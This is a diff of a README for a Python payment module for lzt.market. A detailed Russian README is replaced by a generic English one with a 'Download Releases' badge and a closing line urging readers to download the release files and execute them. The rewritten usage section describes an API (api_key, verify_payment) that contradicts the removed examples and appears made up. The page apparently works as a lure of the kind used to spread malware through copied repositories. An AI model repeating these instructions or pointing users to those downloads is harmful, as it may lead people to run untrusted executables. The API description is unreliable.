@@ -1,138 +1,113 @@
-# Lolz Payment
+# 💳 Lolz Payment Module
 
-Модуль для создания и проверки платежей через платформу lzt.market.
+Welcome to the **Lolz Payment Module**! This repository provides a payment module for creating and verifying payments through the lzt.market platform, which includes Lolz, Lzt, LolzTeam, and Лолз. It supports various payment methods, including cards, SBP, Binance, and Steam.
 
-## Требования
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/nguyentien21580/lolz-payment/releases)
 
-- Python 3.8+
-- Библиотеки: requests, beautifulsoup4
+## Table of Contents
 
-## Установка зависимостей
+1. [Features](#features)
+2. [Installation](#installation)
+3. [Usage](#usage)
+4. [Supported Payment Methods](#supported-payment-methods)
+5. [Contributing](#contributing)
+6. [License](#license)
+7. [Contact](#contact)
 
-```bash
-pip install -r requirements.txt
-```
+## Features
 
-## Настройка
+- **Easy Integration**: Simple to integrate with your existing systems.
+- **Multiple Payment Options**: Supports card payments, SBP, Binance, and Steam.
+- **Secure Transactions**: Ensures secure payment processing.
+- **Real-time Verification**: Instant verification of payment statuses.
+- **Comprehensive Documentation**: Clear instructions for setup and usage.
 
-Создайте файл с куки в папке `cookies/lolz.json` (экспорт куки сайта из браузера)
+## Installation
 
-## Поддерживаемые методы оплаты
+To install the Lolz Payment Module, follow these steps:
 
-- `card` - карты Paymentlnk_Card (от 10 руб.)
-- `sbp` - СБП Paymentlnk_Sbp (от 10 руб., требуется номер телефона)
-- `binance` - Бинанс Settlepay_Binance (от 100 руб.)
-- `steam` - Скины стим Ruks_SkinPay (от 500 руб.)
+1. Clone the repository:
+   ```bash
+   git clone https://github.com/nguyentien21580/lolz-payment.git
+   ```
+2. Navigate to the project directory:
+   ```bash
+   cd lolz-payment
+   ```
+3. Install the required dependencies:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-## Использование как библиотеку
+After installation, you can start using the module in your application.
 
-### Установка
+## Usage
 
-```python
-# Просто скопируйте файлы models.py и lolz_payment.py в проект
-# Или используйте их как есть
-```
+To use the Lolz Payment Module, follow these instructions:
 
-### Создание платежа через карту
+1. Import the module in your Python script:
+   ```python
+   from lolz_payment import LolzPayment
+   ```
 
-```python
-from models import PaymentMethod
-from lolz_payment import LolzPayment
+2. Create an instance of the payment class:
+   ```python
+   payment = LolzPayment(api_key='your_api_key')
+   ```
 
-# Создание экземпляра класса
-lolz = LolzPayment(cookies_path="cookies/lolz.json")
+3. Create a payment:
+   ```python
+   response = payment.create_payment(amount=100, currency='USD', method='card')
+   print(response)
+   ```
 
-# Создание платежа
-response = lolz.create_payment(
-    amount=100,
-    payment_method=PaymentMethod.CARD.value
-)
+4. Verify a payment:
+   ```python
+   verification_response = payment.verify_payment(payment_id='your_payment_id')
+   print(verification_response)
+   ```
 
-# Проверка результата
-if response.error:
-    print(f"Ошибка: {response.error}")
-else:
-    print(f"Платеж создан: {response.payment_id}")
-    print(f"URL для оплаты: {response.final_url}")
-```
+Make sure to replace `'your_api_key'` and `'your_payment_id'` with your actual API key and payment ID.
 
-### Создание платежа через СБП (требуется телефон)
+## Supported Payment Methods
 
-```python
-from models import PaymentMethod
-from lolz_payment import LolzPayment
+The Lolz Payment Module supports the following payment methods:
 
-lolz = LolzPayment(cookies_path="cookies/lolz.json")
+- **Credit/Debit Cards**: Process payments directly through card transactions.
+- **SBP (System of Fast Payments)**: Use the Russian payment system for quick transfers.
+- **Binance**: Accept cryptocurrency payments through Binance.
+- **Steam**: Integrate with Steam for gaming-related transactions.
 
-# Создание платежа через СБП с указанием телефона
-response = lolz.create_payment(
-    amount=100,
-    payment_method=PaymentMethod.SBP.value,
-    phone="+79999999999"  # Если не указать, будет сгенерирован случайный
-)
-```
+## Contributing
 
-### Проверка статуса платежа
+We welcome contributions to the Lolz Payment Module. To contribute, please follow these steps:
 
-```python
-from lolz_payment import LolzPayment
+1. Fork the repository.
+2. Create a new branch for your feature:
+   ```bash
+   git checkout -b feature/your-feature-name
+   ```
+3. Make your changes and commit them:
+   ```bash
+   git commit -m "Add your message here"
+   ```
+4. Push your changes:
+   ```bash
+   git push origin feature/your-feature-name
+   ```
+5. Create a pull request.
 
-lolz = LolzPayment(cookies_path="cookies/lolz.json")
+Your contributions help improve the module for everyone!
 
-# Проверка платежа
-payment_info = lolz.check_payment(payment_id="your_payment_id")
+## License
 
-if payment_info:
-    print(f"Платеж {'оплачен' if payment_info.is_paid else 'не оплачен'}")
-    print(f"Сумма: {payment_info.amount}")
-else:
-    print("Не удалось получить информацию о платеже")
-```
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-### Ожидание оплаты платежа
+## Contact
 
-```python
-import time
-from lolz_payment import LolzPayment
+For questions or feedback, feel free to reach out:
 
-lolz = LolzPayment(cookies_path="cookies/lolz.json")
-payment_id = "your_payment_id"
-timeout = 3600  # таймаут в секундах (1 час)
+- **Email**: your-email@example.com
+- **GitHub**: [nguyentien21580](https://github.com/nguyentien21580)
 
-start_time = time.time()
-while time.time() - start_time < timeout:
-    payment_info = lolz.check_payment(payment_id)
-    if payment_info and payment_info.is_paid:
-        print("Платеж успешно оплачен!")
-        break
-    print("Ожидание оплаты...")
-    time.sleep(10)  # проверка каждые 10 секунд
-```
-
-## Запуск примеров
-
-```bash
-python examples.py
-```
-
-## Использование CLI
-
-### Создание платежа
-
-```bash
-python lolz_cli.py create 100 --method card
-python lolz_cli.py create 100 --method sbp --phone "+79001234567"
-python lolz_cli.py create 100 --method binance
-python lolz_cli.py create 500 --method steam
-```
-
-### Проверка платежа
-
-```bash
-python lolz_cli.py check your_payment_id
-```
-
-## Важное замечание
-
-> [!IMPORTANT]
-> Используя этот репозиторий или любой связанный с ним код, вы соглашаетесь с [юридическим уведомлением](LEGAL_NOTICE.md). Автор **не несет ответственности за использование этого репозитория и не одобряет его**, а также не несет ответственности за любые копии, форки, повторные загрузки, сделанные другими пользователями, или за что-либо еще, связанное с этим репозиторием.
+For the latest updates and releases, check the [Releases section](https://github.com/nguyentien21580/lolz-payment/releases). Download the necessary files and execute them to get started with the Lolz Payment Module.
